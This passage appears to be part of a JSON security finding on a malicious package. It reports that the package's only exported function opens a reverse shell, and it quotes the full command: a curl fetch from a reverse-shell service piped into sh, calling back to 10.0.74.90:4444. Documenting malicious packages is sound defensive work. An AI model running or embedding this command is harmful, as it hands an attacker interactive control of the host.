  "summary": "Package executes reverse shell payload via exported command",
  "details": "The package's sole export `command` invokes `/bin/bash -c \"curl https://reverse-shell.sh/10.0.74.90:4444|sh\"` (index.js:5), fetching and executing a remote shell that connects back to 10.0.74.90:4444. Any installer who requires this package and calls the exported function gives the attacker an interactive reverse shell on the host. Package metadata is placeholder (empty author, generic 'libzona' description) and no other functionality is present — the package exists solely to deliver this payload.",
